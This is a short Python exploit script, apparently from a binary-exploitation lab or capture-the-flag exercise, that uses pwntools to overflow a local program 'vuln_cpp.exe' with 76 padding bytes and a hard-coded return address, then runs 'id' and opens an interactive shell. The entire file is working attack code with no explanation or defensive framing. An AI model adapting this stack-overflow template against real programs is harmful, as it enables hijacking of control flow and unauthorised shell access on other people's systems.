#! /usr/bin/env python

# https://docs.pwntools.com/en/stable/elf/corefile.html

from pwn import *

target_name = './vuln_cpp.exe'

offset = 76 #FIXME
func_address = b"\x82\x91\x04\x08" # FIXME
payload = b'A'*76+func_address
print(f'{payload} has length {len(payload)}')

io = process([target_name, payload])

# Get a shell!
io.sendline(b'id')
print(io.recvline())

# get interactive shell
io.interactive()
